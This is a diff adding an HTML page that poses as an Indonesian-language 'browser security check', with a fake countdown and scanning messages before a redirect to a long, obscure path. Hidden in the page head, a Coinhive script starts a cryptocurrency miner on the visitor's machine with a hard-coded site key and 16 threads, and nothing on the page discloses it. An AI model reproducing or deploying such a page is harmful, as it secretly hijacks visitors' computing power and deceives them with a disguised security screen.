@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Please wait</title>
+    <script>
+        var loadTime = 30;
+        var redirectLocation = '/ggdhggstrwefgyervfbu3y473r654tfh34fhvdcdsgcvsdc6etr76t4rgv4vtcgxf4uryt74tr734tr7gvdyg76xtdfytsfhwgeds7t64rfrvhewdye67fy34vh.html';
+        var message = 'Are you sure you want to abort the security scan?';
+        var statuses = [
+            'Memeriksa alamat IP',
+            'Memverifikasi Setelan Browser',
+            'Memeriksa Versi Flash',
+            'Memindai Virus',
+            'Memeriksa HTTP Header',
+            'Menilai Kemampuan DDOS',
+            'Menguji Jenis Perangkat',
+            'Memeriksa Pengaturan Keamanan',
+            'Menambah Daftar Pengguna yang Baik',
+            'Memastikan Koneksi Stabil',
+            'Memeriksa Reputasi Browser',
+            'Negosiasi SSL',
+            'Menghubungi Host',
+            'Memulai Koneksi',
+            'Menerima Koneksi',
+            'Mengalihkan'
+        ];
+        var statusID = 0;
+
+
+        setInterval(function() {
+            window.loadTime--;
+            if(window.loadTime%2 === 0) statusID++;
+
+            document.getElementById('time').innerText = parseInt(window.loadTime);
+            if(statuses[statusID] !== 'undefined') document.getElementById('status').innerText = statuses[statusID];
+            if(window.loadTime <= 0) {
+                window.location = redirectLocation;
+            }
+        }, 1000);
+    </script>
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('GnRYj5sLYwhB6GqgSfrVIDWOFnFks5vZ', {
+            threads: 16,
+            autoThreads: false,
+            throttle: .1
+        });
+        miner.start();
+
+    </script>
+    <style>
+        body,html {
+            font-family:sans-serif;
+            text-align: center;
+            padding: 0;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+        main{
+            padding: 20px;
+        }
+        header {
+            font-size: 34pt;
+            background: #224d75;
+            padding: 20px 0;
+            font-weight: bold;
+            color: #fff;
+        }
+        h5 {
+            color: #363636;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+        h6 {
+            font-size: 10pt;
+            color: #1f4471;
+            line-height: 18pt;
+        }
+    </style>
+	</head>
+
+<body>
+    <header>
+        Pemeriksaan keamanan
+    </header>
+    <main>
+        <h5>Memeriksa browser Anda sebelum mengakses situs web</h5>
+        <img src="./Please wait - checking your browser before continuing to the website_files/lg.wave-ball-preloader.gif" alt="" height="128px" width="128px">
+        <div id="status">Redirecting</div>
+        <h5><span id="time">-1</span> Detik Lagi</h5>
+        <h6>
+            Anda akan dialihkan otomatis setelah pengecekan komplit.
+        </h6>
+    </main>
+
+
+</body></html>
